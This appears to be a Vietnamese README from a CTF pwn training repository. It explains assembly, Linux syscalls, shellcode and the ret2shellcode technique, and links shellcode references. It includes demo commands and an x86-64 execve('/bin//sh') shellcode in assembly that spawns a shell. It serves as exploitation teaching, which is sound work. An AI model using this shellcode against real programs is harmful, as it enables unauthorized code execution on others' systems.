# Assembly?

`Assembly` là hợp ngữ, là một ngôn ngữ cấp thấp, nằm ở giữa ngôn ngữ lập trình bậc cao (`python`, ...), trung (`C++`, ...) và mã máy (`machine-code`). Assembly phụ thuộc trực tiếp vào kiến trúc hệ thống CPU đang chạy (`x86`, `x86-64`, `arm`, `MIPS`, ...). Assembly thể hiện chính xác những gì mà chương trình thực sự chạy ở mức hệ thống (register, memory, ...).

Link học `x86`:

[https://aaronbloomfield.github.io/pdr/slides/08-assembly-32bit.html#/cover](https://aaronbloomfield.github.io/pdr/slides/08-assembly-32bit.html#/cover)

Link học `x86-64`:

[https://aaronbloomfield.github.io/pdr/slides/08-assembly-64bit.html#/cover](https://aaronbloomfield.github.io/pdr/slides/08-assembly-64bit.html#/cover)


# Syscall?

`Syscall` là các lời gọi hệ thống, là cách mà một chương trình tương tác với hệ điều hành nhân linux. Các shellcode phổ biến có thể kể đến là `open(mở file)`, `read(đọc)`, `write(ghi)`, `execve(chạy chương trình)`, ... Các mã assembly của các thư viện libc sẽ dùng các syscall này để tương tác với hệ điều hành và thực hiện các chức năng cần thiết. Ví dụ hàm `fopen(mở file)` sẽ gọi đến syscall `open()` để tiến hành mở file, hàm `puts()` sẽ gọi đến syscall `write()` để ghi các giá trị ra màn hình, ...

Danh sách các syscall tham khảo:

[https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md](https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md)

# Shellcode?

`Shellcode` là thuật ngữ chung gọi các đoạn mã assembly được chính các hacker chèn vào chương trình và chạy chúng với mục đích độc hại (trên linux thông thường là gọi đến shell `/bin/sh`, `/bin/bash`, ...)

# Ret2shellcode?

`Ret2shellcode` là kĩ thuật tấn công lợi dụng các lỗ hổng phần mềm và chèn các câu lệnh `shellcode` độc hại vào chương trình để thực thi theo ý muốn của hacker. Các đoạn mã `assembly` được chèn vào chương trình thường được viết một cách tối giản, phục vụ đủ các mục đích cần thiết và luôn chạy được trong các trường hợp khác nhau. Một số `payload shellcode` nâng cao cần thêm yêu cầu về độ dài, kí tự hạn chế, ...Đối với `linux` thì các `shellcode` thường dùng trực tiếp các `syscall` để tương tác với hệ điều hành một cách ngắn gọn và nhanh chóng. Các payload thường dùng khi chơi CTF có thể tìm theo link dưới, các bạn mới có thể tham khảo, tuy nhiên tự viết `shellcode` cũng là một kĩ năng quan trọng của các pwner, vì `shellcode` thường xuyên cần sự chỉnh sửa hoặc tự viết trong nhiều trường hợp. 

Các shellcode tham khảo:

[http://shell-storm.org/shellcode/index.html](http://shell-storm.org/shellcode/index.html)

Shellcode <--> hex:

[https://defuse.ca/online-x86-assembler.htm#disassembly](https://defuse.ca/online-x86-assembler.htm#disassembly)

# Hướng dẫn chạy demo

Để compile code chạy lệnh:
```cmd
gcc test.c -o test
```

Để chạy demo:
```cmd
cat <(cat shellcode) - | ./test
```

Payload shellcode trong file shellcode được tạo từ các câu lệnh dưới, và được gen thông qua trang `Shellcode <--> hex` phía trên

```assembly
xor eax, eax
xor esi, esi
xor edx, edx
mov rdi, 0x68732f2f6e69622f
push rax
push rdi
push rsp
pop rdi
mov al, 0x3b
syscall
```

# Sponsors

<img src="https://github.com/vnPwners/collaborators-and-sponsors/raw/main/self/vnpwners.png" alt="vnPwners" width="64" height="64"/> <img src="https://github.com/vnPwners/collaborators-and-sponsors/raw/main/uit-inseclab/logo_inseclab-03.png" alt="UIT Inseclab" width="64" height="64"/>
